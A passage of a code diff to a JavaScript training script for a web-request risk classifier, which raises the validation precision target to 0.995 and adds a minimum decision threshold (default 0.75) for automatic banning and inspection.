-      subsample: 1, splits: [0], evalSplit: 1, minPrecision: 0.9, seed: (seed * 1000 + candidates.length) >>> 0,
+      subsample: 1, splits: [0], evalSplit: 1, minPrecision: 0.995, seed: (seed * 1000 + candidates.length) >>> 0,
     };
     const key = `${cfg.lr}|${cfg.l2}|${cfg.epochs}|${cfg.posBoost}`;
     if (seen.has(key)) continue;
@@ -1080,15 +1195,19 @@ export async function train({
     valScores.push(scoreSample(model, s.vec));
     valLabels.push(s.y);
   }
-  const base = bestThreshold(valScores, valLabels, 0.9);
-  const high = highThreshold(valScores, valLabels, base.threshold, Math.max(20, Math.floor(valLabels.filter((y) => y === 1).length * 0.01)));
-  const highT = Math.min(0.99, Math.max(high.threshold, Math.round((base.threshold + 0.05) * 1000) / 1000));
-  log(`阈值: base=${base.threshold} (val P=${base.precision.toFixed(3)} R=${base.recall.toFixed(3)}) high=${highT} (val P=${high.precision.toFixed(3)} R=${high.recall.toFixed(3)})`);
+  // 阈值服务于自动封禁/巡检：先保证验证集 precision >= 0.995，再在该区间内最大化 F1；
+  // 同时设置不低于 0.75 的工作点，避免 F1 最优把阈值压到 0.2x 而放大巡检噪音。
+  const base = bestThreshold(valScores, valLabels, 0.995);
+  const baseT = Math.min(0.99, Math.max(minThreshold, base.threshold));
+  const baseMetrics = metricsAt(valScores, valLabels, baseT);
+  const high = highThreshold(valScores, valLabels, baseT, Math.max(20, Math.floor(valLabels.filter((y) => y === 1).length * 0.01)));
+  const highT = Math.min(0.99, Math.max(high.threshold, Math.round((baseT + 0.05) * 1000) / 1000));
+  log(`阈值: base=${baseT} (val P=${baseMetrics.precision.toFixed(3)} R=${baseMetrics.recall.toFixed(3)}) high=${highT} (val P=${high.precision.toFixed(3)} R=${high.recall.toFixed(3)})`);
 
-  const valMetrics = summarize(valScores, valLabels, base.threshold);
-  const test = evaluate(model, samples, 3, null, base.threshold);
-  const realTest = evaluate(model, samples, 3, 0, base.threshold);
-  const synthTest = evaluate(model, samples, 3, 1, base.threshold);
+  const valMetrics = summarize(valScores, valLabels, baseT);
+  const test = evaluate(model, samples, 3, null, baseT);
+  const realTest = evaluate(model, samples, 3, 0, baseT);
+  const synthTest = evaluate(model, samples, 3, 1, baseT);
   const testHigh = evaluate(model, samples, 3, null, highT);
 
   const smoke = smokeSet();
@@ -1096,7 +1215,7 @@ export async function train({
   const misses = [];
   for (const s of smoke) {
     const sc = scoreSample(model, vectorizeSparse(riskMlTokens(s.ev), dim));
-    const pred = sc >= base.threshold ? 1 : 0;
+    const pred = sc >= baseT ? 1 : 0;
     if (pred === s.y) hit++;
     else misses.push({ want: s.y, got: pred, score: Math.round(sc * 1e4) / 1e4, path: s.ev.path, ua: String(s.ev.headers['user-agent'] || '').slice(0, 24) });
   }
@@ -1113,7 +1232,7 @@ export async function train({
     feature: FEATURE_VERSION,
     dim,
     bias: Math.round(model.bias * 1e6) / 1e6,
-    threshold: Math.round(base.threshold * 1000) / 1000,
+    threshold: Math.round(baseT * 1000) / 1000,
     high: Math.round(highT * 1000) / 1000,
     weights: sparse,
     createdAt: new Date().toISOString(),
@@ -1148,7 +1267,7 @@ async function main() {
   const args = process.argv.slice(2);
   const opt = {
     dim: DEFAULT_DIM, search: 48, bags: 8, synthetic: 120000, workers: os.availableParallelism ? os.availableParallelism() : os.cpus().length,
-    realWeight: 2.5, maxPerClass: 300000, seed: 42, quick: false, inputs: [], out: 'risk-model.json',
+    realWeight: 2.5, maxPerClass: 300000, minThreshold: 0.75, seed: 42, quick: false, inputs: [], out: 'risk-model.json',
   };
   for (let i = 0; i < args.length; i++) {
     const a = args[i];
@@ -1161,6 +1280,7 @@ async function main() {
     else if (a === '--workers') opt.workers = Number(args[++i]);
     else if (a === '--real-weight') opt.realWeight = Number(args[++i]);
     else if (a === '--max-per-class') opt.maxPerClass = Number(args[++i]);
+    else if (a === '--min-threshold') opt.minThreshold = Number(args[++i]);
     else if (a === '--seed') opt.seed = Number(args[++i]);
     else if (a === '--quick') opt.quick = true;
   }
